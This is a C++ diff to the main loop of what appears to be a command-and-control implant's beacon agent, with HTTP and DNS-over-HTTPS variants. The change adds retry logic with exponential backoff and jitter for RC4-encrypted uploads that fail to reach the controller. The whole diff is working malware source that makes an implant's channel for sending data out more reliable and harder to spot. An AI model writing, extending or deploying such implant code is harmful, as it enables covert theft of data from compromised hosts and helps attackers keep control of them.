@@ -302,11 +302,36 @@ void AgentMain()
 	*packerOut = Packer();
 	packerOut->Pack32(0);
 
+	BYTE* pendingUpload = NULL;
+	ULONG pendingUploadSize = 0;
+	ULONG uploadBackoffMs = 0;
+	ULONG nextUploadAttemptTick = 0;
+
 	do {
-		if (packerOut->datasize() > 4) {
+		if (pendingUpload && pendingUploadSize) {
+			ULONG now = GetTickCount();
+			if (now >= nextUploadAttemptTick) {
+				g_Connector->SendData(pendingUpload, pendingUploadSize);
+				if (g_Connector->WasLastQueryOk()) {
+					MemFreeLocal((LPVOID*)&pendingUpload, pendingUploadSize);
+					pendingUpload = NULL;
+					pendingUploadSize = 0;
+					uploadBackoffMs = 0;
+					nextUploadAttemptTick = 0;
+				} else {
+					ULONG base = uploadBackoffMs ? uploadBackoffMs : 500;
+					ULONG next = base * 2;
+					if (next > 30000) next = 30000;
+					uploadBackoffMs = next;
+					nextUploadAttemptTick = GetTickCount() + uploadBackoffMs + (GetTickCount() & 0x3FF);
+				}
+			} else {
+				g_Connector->SendData(NULL, 0);
+			}
+		} else if (packerOut->datasize() > 4) {
 			// 先写入原始长度头
 			packerOut->Set32(0, packerOut->datasize());
-		
+	
 			BYTE* plainBuf = packerOut->data();
 			ULONG plainLen = packerOut->datasize();
 		
@@ -342,14 +367,33 @@ void AgentMain()
 				memcpy(sessionBuf + 5, payload, payloadLen);
 			}
 		
+			BYTE* sendBuf = NULL;
+			ULONG sendLen = 0;
+
 			if (!sessionBuf) {
 				// 内存分配失败，退回原逻辑
 				EncryptRC4(plainBuf, (int)plainLen, g_Agent->SessionKey, 16);
-				g_Connector->SendData(plainBuf, plainLen);
+				sendBuf = plainBuf;
+				sendLen = plainLen;
+				g_Connector->SendData(sendBuf, sendLen);
 			} else {
 				// RC4 加密封装后的会话缓冲
 				EncryptRC4(sessionBuf, (int)sessionLen, g_Agent->SessionKey, 16);
-				g_Connector->SendData(sessionBuf, sessionLen);
+				sendBuf = sessionBuf;
+				sendLen = sessionLen;
+				g_Connector->SendData(sendBuf, sendLen);
+			}
+
+			if (!g_Connector->WasLastQueryOk() && sendBuf && sendLen) {
+				pendingUpload = (BYTE*)MemAllocLocal(sendLen);
+				if (pendingUpload) {
+					memcpy(pendingUpload, sendBuf, sendLen);
+					pendingUploadSize = sendLen;
+					uploadBackoffMs = uploadBackoffMs ? uploadBackoffMs : 500;
+					nextUploadAttemptTick = GetTickCount() + uploadBackoffMs + (GetTickCount() & 0x3FF);
+				}
+			}
+			if (sessionBuf) {
 				MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);
 			}
 		
@@ -417,6 +461,12 @@ void AgentMain()
 	g_Connector->SendData(packerOut->data(), packerOut->datasize());
 	packerOut->Clear(TRUE);
 	g_Connector->RecvClear();
+
+	if (pendingUpload && pendingUploadSize) {
+		MemFreeLocal((LPVOID*)&pendingUpload, pendingUploadSize);
+		pendingUpload = NULL;
+		pendingUploadSize = 0;
+	}
 
 	g_Connector->CloseConnector();
 	AgentClear(g_Agent->config->exit_method);
@@ -511,8 +561,33 @@ void AgentMain()
 	*packerOut = Packer();
 	packerOut->Pack32(0);
 
+	BYTE* pendingUpload = NULL;
+	ULONG pendingUploadSize = 0;
+	ULONG uploadBackoffMs = 0;
+	ULONG nextUploadAttemptTick = 0;
+
 	do {
-		if (packerOut->datasize() > 4) {
+		if (pendingUpload && pendingUploadSize) {
+			ULONG now = GetTickCount();
+			if (now >= nextUploadAttemptTick) {
+				g_Connector->SendData(pendingUpload, pendingUploadSize);
+				if (g_Connector->WasLastQueryOk()) {
+					MemFreeLocal((LPVOID*)&pendingUpload, pendingUploadSize);
+					pendingUpload = NULL;
+					pendingUploadSize = 0;
+					uploadBackoffMs = 0;
+					nextUploadAttemptTick = 0;
+				} else {
+					ULONG base = uploadBackoffMs ? uploadBackoffMs : 500;
+					ULONG next = base * 2;
+					if (next > 30000) next = 30000;
+					uploadBackoffMs = next;
+					nextUploadAttemptTick = GetTickCount() + uploadBackoffMs + (GetTickCount() & 0x3FF);
+				}
+			} else {
+				g_Connector->SendData(NULL, 0);
+			}
+		} else if (packerOut->datasize() > 4) {
 			packerOut->Set32(0, packerOut->datasize());
 			BYTE* plainBuf = packerOut->data();
 			ULONG plainLen = packerOut->datasize();
@@ -546,12 +621,29 @@ void AgentMain()
 				memcpy(sessionBuf + 5, payload, payloadLen);
 			}
 		
+			BYTE* sendBuf = NULL;
+			ULONG sendLen = 0;
 			if (!sessionBuf) {
 				EncryptRC4(plainBuf, (int)plainLen, g_Agent->SessionKey, 16);
-				g_Connector->SendData(plainBuf, plainLen);
+				sendBuf = plainBuf;
+				sendLen = plainLen;
+				g_Connector->SendData(sendBuf, sendLen);
 			} else {
 				EncryptRC4(sessionBuf, (int)sessionLen, g_Agent->SessionKey, 16);
-				g_Connector->SendData(sessionBuf, sessionLen);
+				sendBuf = sessionBuf;
+				sendLen = sessionLen;
+				g_Connector->SendData(sendBuf, sendLen);
+			}
+			if (!g_Connector->WasLastQueryOk() && sendBuf && sendLen) {
+				pendingUpload = (BYTE*)MemAllocLocal(sendLen);
+				if (pendingUpload) {
+					memcpy(pendingUpload, sendBuf, sendLen);
+					pendingUploadSize = sendLen;
+					uploadBackoffMs = uploadBackoffMs ? uploadBackoffMs : 500;
+					nextUploadAttemptTick = GetTickCount() + uploadBackoffMs + (GetTickCount() & 0x3FF);
+				}
+			}
+			if (sessionBuf) {
 				MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);
 			}
 		
@@ -605,9 +697,15 @@ void AgentMain()
 	packerOut->Clear(TRUE);
 	g_Connector->RecvClear();
 
+	if (pendingUpload && pendingUploadSize) {
+		MemFreeLocal((LPVOID*)&pendingUpload, pendingUploadSize);
+		pendingUpload = NULL;
+		pendingUploadSize = 0;
+	}
+
 	g_Connector->CloseConnector();
 	AgentClear(g_Agent->config->exit_method);
-}
+	}
 
 #elif defined(BEACON_DNS_DOH)
 
@@ -682,8 +780,33 @@ void AgentMain()
 	*packerOut = Packer();
 	packerOut->Pack32(0);
 
+	BYTE* pendingUpload = NULL;
+	ULONG pendingUploadSize = 0;
+	ULONG uploadBackoffMs = 0;
+	ULONG nextUploadAttemptTick = 0;
+
 	do {
-		if (packerOut->datasize() > 4) {
+		if (pendingUpload && pendingUploadSize) {
+			ULONG now = GetTickCount();
+			if (now >= nextUploadAttemptTick) {
+				TX_SEND(pendingUpload, pendingUploadSize);
+				if (TX_LAST_OK()) {
+					MemFreeLocal((LPVOID*)&pendingUpload, pendingUploadSize);
+					pendingUpload = NULL;
+					pendingUploadSize = 0;
+					uploadBackoffMs = 0;
+					nextUploadAttemptTick = 0;
+				} else {
+					ULONG base = uploadBackoffMs ? uploadBackoffMs : 500;
+					ULONG next = base * 2;
+					if (next > 30000) next = 30000;
+					uploadBackoffMs = next;
+					nextUploadAttemptTick = GetTickCount() + uploadBackoffMs + (GetTickCount() & 0x3FF);
+				}
+			} else {
+				TX_SEND(NULL, 0);
+			}
+		} else if (packerOut->datasize() > 4) {
 			packerOut->Set32(0, packerOut->datasize());
 			BYTE* plainBuf = packerOut->data();
 			ULONG plainLen = packerOut->datasize();
@@ -717,12 +840,29 @@ void AgentMain()
 				memcpy(sessionBuf + 5, payload, payloadLen);
 			}
 
+			BYTE* sendBuf = NULL;
+			ULONG sendLen = 0;
 			if (!sessionBuf) {
 				EncryptRC4(plainBuf, (int)plainLen, g_Agent->SessionKey, 16);
-				TX_SEND(plainBuf, plainLen);
+				sendBuf = plainBuf;
+				sendLen = plainLen;
+				TX_SEND(sendBuf, sendLen);
 			} else {
 				EncryptRC4(sessionBuf, (int)sessionLen, g_Agent->SessionKey, 16);
-				TX_SEND(sessionBuf, sessionLen);
+				sendBuf = sessionBuf;
+				sendLen = sessionLen;
+				TX_SEND(sendBuf, sendLen);
+			}
+			if (!TX_LAST_OK() && sendBuf && sendLen) {
+				pendingUpload = (BYTE*)MemAllocLocal(sendLen);
+				if (pendingUpload) {
+					memcpy(pendingUpload, sendBuf, sendLen);
+					pendingUploadSize = sendLen;
+					uploadBackoffMs = uploadBackoffMs ? uploadBackoffMs : 500;
+					nextUploadAttemptTick = GetTickCount() + uploadBackoffMs + (GetTickCount() & 0x3FF);
+				}
+			}
+			if (sessionBuf) {
 				MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);
 			}
 
@@ -841,6 +981,12 @@ void AgentMain()
 	TX_SEND(packerOut->data(), packerOut->datasize());
 	packerOut->Clear(TRUE);
 	TX_CLEAR();
+
+	if (pendingUpload && pendingUploadSize) {
+		MemFreeLocal((LPVOID*)&pendingUpload, pendingUploadSize);
+		pendingUpload = NULL;
+		pendingUploadSize = 0;
+	}
 
 	// Close both connectors explicitly.
 	if (g_DnsConnector)
